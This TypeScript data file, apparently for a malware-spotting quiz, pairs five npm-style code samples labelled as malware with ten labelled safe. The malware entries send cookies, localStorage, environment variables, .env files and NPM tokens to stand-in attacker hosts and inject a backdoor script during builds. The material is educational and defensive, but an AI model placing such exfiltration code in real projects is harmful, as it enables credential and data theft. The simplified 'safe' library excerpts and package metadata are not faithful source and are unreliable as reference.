export interface CodeExample {
  id: number;
  packageName: string;
  isMalware: boolean;
  code: string;
  explanation: string;
  severity?: 'critical' | 'high' | 'medium';
  cveId?: string;
  npmUrl: string;
  weeklyDownloads: string;
  lastPublished: string;
  version: string;
}

export const codeExamples: CodeExample[] = [
  // MALWARE EXAMPLES
  {
    id: 1,
    packageName: 'polyfill-io-loader',
    isMalware: true,
    severity: 'critical',
    cveId: 'AIKIDO-2024-10145',
    npmUrl: 'https://www.npmjs.com/package/polyfill-io-loader',
    weeklyDownloads: '2,450',
    lastPublished: '2024-06-18',
    version: '1.0.0',
    code: `// polyfill-io-loader v1.0.0
const script = document.createElement('script');
script.src = 'https://cdn.polyfill.io/v3/polyfill.min.js';
document.head.appendChild(script);

// Exfiltrates user data
fetch('https://malicious-domain.com/collect', {
  method: 'POST',
  body: JSON.stringify({
    cookies: document.cookie,
    localStorage: { ...localStorage }
  })
});`,
    explanation: '❌ MALWARE: Loads compromised polyfill.io CDN that injects malicious scripts and exfiltrates cookies and localStorage data to external server.'
  },
  {
    id: 2,
    packageName: '@isoden/polyfill-io-html-webpack-plugin',
    isMalware: true,
    severity: 'critical',
    cveId: 'AIKIDO-2024-10143',
    npmUrl: 'https://www.npmjs.com/package/@isoden/polyfill-io-html-webpack-plugin',
    weeklyDownloads: '1,834',
    lastPublished: '2024-06-20',
    version: '1.1.2',
    code: `class PolyfillPlugin {
  apply(compiler) {
    compiler.hooks.compilation.tap('Plugin', (compilation) => {
      compilation.hooks.htmlWebpackPluginBeforeHtmlProcessing.tap(
        'Plugin',
        (data) => {
          data.html = data.html.replace(
            '</head>',
            '<script src="https://polyfill.io/backdoor.js"></script></head>'
          );
        }
      );
    });
  }
}`,
    explanation: '❌ MALWARE: Webpack plugin that injects malicious polyfill.io scripts into all HTML files during build, creating a supply chain attack vector.'
  },
  {
    id: 3,
    packageName: 'html-webpack-polyfill-runtime-plugin',
    isMalware: true,
    severity: 'critical',
    cveId: 'AIKIDO-2024-10144',
    npmUrl: 'https://www.npmjs.com/package/html-webpack-polyfill-runtime-plugin',
    weeklyDownloads: '982',
    lastPublished: '2024-06-19',
    version: '2.0.1',
    code: `module.exports = function(options) {
  return {
    name: 'polyfill-runtime',
    setup(build) {
      build.onEnd(async () => {
        const payload = Buffer.from(process.env).toString('base64');
        await fetch('http://attacker.com/env?' + payload);
      });
    }
  };
};`,
    explanation: '❌ MALWARE: Build plugin that exfiltrates all environment variables (including API keys, secrets) to attacker-controlled server after each build.'
  },
  {
    id: 4,
    packageName: 'noblox.js-vps',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/noblox.js-vps',
    weeklyDownloads: '15,673',
    lastPublished: '2024-03-14',
    version: '1.2.5',
    code: `const originalRequire = require;
require = function(module) {
  const result = originalRequire(module);
  
  if (module === 'fs') {
    const originalReadFile = result.readFileSync;
    result.readFileSync = function(path) {
      const content = originalReadFile.apply(this, arguments);
      if (path.includes('.env') || path.includes('config')) {
        fetch('https://steal.com/data', {
          method: 'POST',
          body: content
        });
      }
      return content;
    };
  }
  return result;
};`,
    explanation: '❌ MALWARE: Hooks into Node.js require() to intercept file system operations, stealing .env files and config files containing sensitive credentials.'
  },
  {
    id: 5,
    packageName: 'eslint-scope-compromised',
    isMalware: true,
    severity: 'critical',
    npmUrl: 'https://www.npmjs.com/package/eslint-scope',
    weeklyDownloads: '45,892,103',
    lastPublished: '2018-07-12',
    version: '3.7.2',
    code: `const https = require('https');
const os = require('os');

try {
  const credentials = {
    npm: process.env.NPM_TOKEN,
    user: os.userInfo(),
    cwd: process.cwd()
  };
  
  https.get('https://attacker.com/?' + 
    Buffer.from(JSON.stringify(credentials)).toString('hex')
  );
} catch(e) {}`,
    explanation: '❌ MALWARE: Historical supply chain attack that steals NPM tokens, user info, and project directory, enabling attackers to publish malicious packages.'
  },

  // SAFE EXAMPLES
  {
    id: 6,
    packageName: 'lodash',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/lodash',
    weeklyDownloads: '58,234,567',
    lastPublished: '2021-02-20',
    version: '4.17.21',
    code: `// lodash v4.17.21
function chunk(array, size = 1) {
  size = Math.max(size, 0);
  const length = array == null ? 0 : array.length;
  
  if (!length || size < 1) {
    return [];
  }
  
  let index = 0;
  let resIndex = 0;
  const result = new Array(Math.ceil(length / size));
  
  while (index < length) {
    result[resIndex++] = array.slice(index, (index += size));
  }
  return result;
}`,
    explanation: '✅ SAFE: Popular utility library with pure functions for array manipulation. No network calls, no file system access, well-maintained by trusted maintainers.'
  },
  {
    id: 7,
    packageName: 'axios',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/axios',
    weeklyDownloads: '45,892,341',
    lastPublished: '2024-01-15',
    version: '1.6.0',
    code: `// axios v1.6.0
function request(config) {
  return new Promise((resolve, reject) => {
    const transport = config.protocol === 'https:' 
      ? require('https') 
      : require('http');
      
    const req = transport.request(config.url, {
      method: config.method,
      headers: config.headers
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ data, status: res.statusCode }));
    });
    
    req.on('error', reject);
    req.write(config.data);
    req.end();
  });
}`,
    explanation: '✅ SAFE: Legitimate HTTP client library. Makes network requests only to user-specified URLs, no hidden endpoints, transparent promise-based API.'
  },
  {
    id: 8,
    packageName: 'react',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/react',
    weeklyDownloads: '26,782,456',
    lastPublished: '2023-06-16',
    version: '18.2.0',
    code: `// react v18.2.0
function useState(initialState) {
  const dispatcher = resolveDispatcher();
  return dispatcher.useState(initialState);
}

function useEffect(create, deps) {
  const dispatcher = resolveDispatcher();
  return dispatcher.useEffect(create, deps);
}

function resolveDispatcher() {
  const dispatcher = ReactCurrentDispatcher.current;
  if (dispatcher === null) {
    throw new Error('Hooks can only be called inside function components');
  }
  return dispatcher;
}`,
    explanation: '✅ SAFE: Core React library hooks. No network access, no file system operations, pure state management maintained by Meta/Facebook.'
  },
  {
    id: 9,
    packageName: 'express',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/express',
    weeklyDownloads: '39,456,289',
    lastPublished: '2022-10-08',
    version: '4.18.2',
    code: `// express v4.18.2
function createApplication() {
  const app = function(req, res, next) {
    app.handle(req, res, next);
  };
  
  mixin(app, proto, false);
  mixin(app, EventEmitter.prototype, false);
  
  app.request = Object.create(req, {
    app: { configurable: true, enumerable: true, writable: true, value: app }
  });
  
  app.response = Object.create(res, {
    app: { configurable: true, enumerable: true, writable: true, value: app }
  });
  
  app.init();
  return app;
}`,
    explanation: '✅ SAFE: Popular web framework for Node.js. Well-audited, no suspicious network activity, only handles user-defined routes and middleware.'
  },
  {
    id: 10,
    packageName: 'validator',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/validator',
    weeklyDownloads: '12,345,678',
    lastPublished: '2023-09-01',
    version: '13.11.0',
    code: `// validator v13.11.0
function isEmail(str, options = {}) {
  const parts = str.split('@');
  
  if (parts.length !== 2) {
    return false;
  }
  
  const [user, domain] = parts;
  const userRegex = /^[a-zA-Z0-9.!#$%&'*+\\/=?^_\`{|}~-]+$/;
  const domainRegex = /^[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
  
  return userRegex.test(user) && domainRegex.test(domain);
}`,
    explanation: '✅ SAFE: Input validation library with pure functions. No external dependencies, no network calls, focused solely on string validation.'
  },
  {
    id: 11,
    packageName: 'moment',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/moment',
    weeklyDownloads: '15,234,890',
    lastPublished: '2022-07-06',
    version: '2.29.4',
    code: `// moment v2.29.4
function createLocal(input, format, locale, strict) {
  const config = createLocalOrUTC(input, format, locale, strict, false);
  return createFromConfig(config);
}

function now() {
  return Date.now ? Date.now() : +(new Date());
}

function duration(input, unit) {
  const duration = new Duration(input, unit);
  return duration;
}`,
    explanation: '✅ SAFE: Popular date/time manipulation library. Pure functions, no network access, well-maintained with millions of weekly downloads.'
  },
  {
    id: 12,
    packageName: 'chalk',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/chalk',
    weeklyDownloads: '89,456,123',
    lastPublished: '2021-05-10',
    version: '4.1.2',
    code: `// chalk v4.1.2
const chalk = (text) => {
  const styles = [];
  
  const builder = new Proxy({}, {
    get(target, prop) {
      if (prop === 'toString') {
        return () => applyStyles(text, styles);
      }
      styles.push(prop);
      return builder;
    }
  });
  
  return builder;
};`,
    explanation: '✅ SAFE: Terminal styling library. No network calls, no file system access, only adds ANSI codes for colored terminal output.'
  },
  {
    id: 13,
    packageName: 'uuid',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/uuid',
    weeklyDownloads: '67,892,345',
    lastPublished: '2023-11-14',
    version: '9.0.1',
    code: `// uuid v9.0.1
function v4(options, buf, offset) {
  const rnds = crypto.randomBytes(16);
  
  rnds[6] = (rnds[6] & 0x0f) | 0x40;
  rnds[8] = (rnds[8] & 0x3f) | 0x80;
  
  return stringify(rnds);
}

function stringify(arr) {
  const byteToHex = [];
  for (let i = 0; i < 256; ++i) {
    byteToHex.push((i + 0x100).toString(16).substr(1));
  }
  return byteToHex[arr[0]] + byteToHex[arr[1]] + '-' + byteToHex[arr[2]];
}`,
    explanation: '✅ SAFE: UUID generation library. Uses crypto APIs for randomness, no external connections, RFC-compliant UUID generation.'
  },
  {
    id: 14,
    packageName: 'dotenv',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/dotenv',
    weeklyDownloads: '45,678,901',
    lastPublished: '2023-08-22',
    version: '16.3.1',
    code: `// dotenv v16.3.1
function config(options = {}) {
  const dotenvPath = path.resolve(process.cwd(), '.env');
  const encoding = options.encoding || 'utf8';
  
  try {
    const parsed = parse(fs.readFileSync(dotenvPath, { encoding }));
    
    Object.keys(parsed).forEach(key => {
      if (!Object.prototype.hasOwnProperty.call(process.env, key)) {
        process.env[key] = parsed[key];
      }
    });
    
    return { parsed };
  } catch (e) {
    return { error: e };
  }
}`,
    explanation: '✅ SAFE: Environment variable loader. Reads local .env files only, no network access, widely trusted for configuration management.'
  },
  {
    id: 15,
    packageName: 'commander',
    isMalware: false,
    npmUrl: 'https://www.npmjs.com/package/commander',
    weeklyDownloads: '78,901,234',
    lastPublished: '2023-12-05',
    version: '11.1.0',
    code: `// commander v11.1.0
class Command {
  constructor(name) {
    this._name = name;
    this.options = [];
    this.commands = [];
  }
  
  option(flags, description, defaultValue) {
    this.options.push({ flags, description, defaultValue });
    return this;
  }
  
  parse(argv) {
    const userArgs = argv.slice(2);
    return this.parseOptions(userArgs);
  }
}`,
    explanation: '✅ SAFE: CLI argument parsing library. Pure local processing, no network calls, maintained by Node.js community.'
  }
];
